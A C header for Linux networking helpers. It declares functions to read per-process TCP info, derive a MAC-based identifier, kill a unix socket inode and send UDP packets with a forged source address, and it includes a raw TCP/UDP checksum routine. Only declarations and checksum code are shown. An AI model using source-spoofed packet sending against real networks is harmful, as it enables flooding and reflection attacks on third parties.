#ifndef NETWORK_H
#define NETWORK_H

#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>

#include <stdbool.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>

enum {
  TCP_OPT_END_LIST = 0,
  TCP_OPT_NO_OP = 1,
  TCP_OPT_MAX_SEG_SIZE = 2,
  TCP_OPT_WINDOW_SCALING = 3,
  TCP_OPT_SACK = 4,
  TCP_OPT_TIMESTAMP = 8,
  TCP_OPT_FASTOPEN = 34,
};

typedef struct {
  uint32_t high;
  uint32_t low;
  char interface[32];
} mac_parse_t, *pmac_parse_t;

typedef struct {
  uint32_t address;
  uint16_t port;
} network_info_t, *pnetwork_info_t;

/* retrieves the fd limit */
int network_fd_limit();

/* retrieves the local network address */
uint32_t network_local_addr();

/* calculates the checksum */
uint16_t csum_compute(void *data, size_t len);

/* retrieves tcp network info on an pid */
pnetwork_info_t network_retrieve_pidinfo(pid_t pid, size_t *count);

/* retrieves mac address */
pmac_parse_t network_retrieve_mac(pmac_parse_t m);

/* kills an unix inode */
void network_kill_unix_inode(char *abstract, int abstract_len);

/* sends spoofed udp */
int network_send_spoof_udp(uint32_t daddr, uint16_t dport, uint32_t saddr, uint16_t sport,
                           void *buf, int len);

static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;

    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

/* converts network mac to hexadecimal  */
static inline void network_mac_alpha16(uint32_t high, uint32_t low, char *out) {
  uint64_t combined = ((uint64_t)high << 32) | low;
  for (int i = 15; i >= 0; i--) {
    out[i] = 'A' + (combined % 26);
    combined /= 26;
  }
  out[16] = '\0';
}
#endif
